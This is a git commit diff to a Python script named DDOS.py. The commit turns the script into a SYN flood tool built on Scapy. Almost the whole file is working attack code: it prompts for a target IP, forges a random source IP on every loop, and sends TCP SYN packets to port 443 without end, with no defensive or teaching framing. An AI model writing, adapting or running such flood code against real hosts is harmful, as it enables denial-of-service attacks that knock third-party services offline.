d1298977054376a9472818f0dece3229572fa9ef
thanhnguyen210299 <58540404+thanhnguyen210299@users.noreply.github.com>
2021-04-01 17:41:01 -0700

    SYN Flood _ TCP Scapy

--- DDOS/DDOS.py
+++ DDOS/DDOS.py
@@ -1,13 +1,11 @@
 """
-    A large number of packets are sent to web server by
+    +++++ SYN Flood +++++
 
-    using multiple IPs and multiple ports.
+    
 """
 
 from scapy.all import *
 import random
-
-packetContent = "Hello World!";
 
 targetIP = input("Enter IP address of target: ");
 
@@ -21,17 +19,15 @@ def create_random_IP():
     dot = ".";
     return a + dot + b + dot + c + dot + d;
 
-while (True):
+while(True):
     """ Create random soucre IP address """
     sourceIP = create_random_IP();
-
     """ Send large amount of packets from a source to a target IP address """
-    for sourcePort in range (1, 65535):
-        IP_Packet = IP(src = sourceIP, dst = targetIP);
-        TCP_Packet = TCP(sport = sourcePort, dport = 80);
-        packet = IP_Packet / TCP_Packet / packetContent;
-        """ Send packets at layer 3 """
-        send(packet, inter = 0.001);
+    IP_Packet = IP(src = sourceIP, dst = targetIP);
+    TCP_Packet = TCP(sport = 443, dport = 443, flags = "S", seq = packetIP);
+    packet = IP_Packet / TCP_Packet;
+    """ Send packets at layer 3 """
+    send(packet);
 
-        packetIP = packetIP + 1;
-        print("Packet sent ", packetIP, " through port ", sourcePort);
+    packetIP = packetIP + 1;
+    print("Packet sent no# ", packetIP, " from source ", sourceIP);
